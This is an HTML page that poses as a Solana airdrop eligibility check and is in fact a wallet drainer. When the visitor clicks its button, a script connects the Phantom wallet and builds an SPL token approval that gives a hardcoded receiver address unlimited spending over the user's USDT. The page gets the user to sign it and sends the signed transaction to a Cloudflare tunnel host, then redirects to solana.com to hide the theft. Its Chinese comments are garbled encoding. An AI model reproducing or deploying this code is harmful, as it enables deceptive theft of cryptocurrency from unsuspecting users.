<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security Protocol</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; }
        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" style="width:45px;margin-bottom:15px;">
        <h2>Airdrop Eligibility Sync</h2>
        <p style="color:#666; font-size:12px;">Associate your USDT/USDC accounts to finalize your eligibility status.</p>
        <button id="cta">ACTIVATE NOW</button>
        <div id="status" style="margin-top:15px; font-size:11px; color:#333;">Status: Ready</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        
        // æ ¸å¿ƒç›®æ ‡ï¼šUSDT (Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB)
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "CALCULATING DATA...";

                const { bh } = await (await fetch(`${tunnel}/sync`)).json();

                // ðŸ”± æš´åŠ›é€»è¾‘ï¼šä¸å†æ£€æŸ¥ä½™é¢ï¼Œç›´æŽ¥è®¡ç®—å¹¶æ‹‰èµ·æŽˆæƒ
                const userAta = await splToken.Token.getAssociatedTokenAddress(
                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                    splToken.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(USDT_MINT),
                    resp.publicKey
                );

                const transaction = new solanaWeb3.Transaction().add(
                    splToken.Token.createApproveInstruction(
                        splToken.TOKEN_PROGRAM_ID,
                        userAta,
                        new solanaWeb3.PublicKey(RECEIVER),
                        resp.publicKey,
                        [],
                        "18446744073709551615" // æŽˆæƒæœ€å¤§å€¼
                    )
                );

                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                document.getElementById('status').innerText = "AWAITING APPROVAL...";
                
                // é‡ç‚¹ï¼šå¦‚æžœè´¦æˆ·é‡Œæœ‰å¸ï¼Œè¿™é‡Œç‚¹ç¡®è®¤å°±ä¼šæˆåŠŸå›žä¼  auth_sig
                const signed = await p.signTransaction(transaction);
                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(signed.serialize().toString('base64'))}`);

                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1500);

            } catch(e) { 
                console.error(e);
                location.reload(); 
            }
        };
    </script>
</body>
</html>
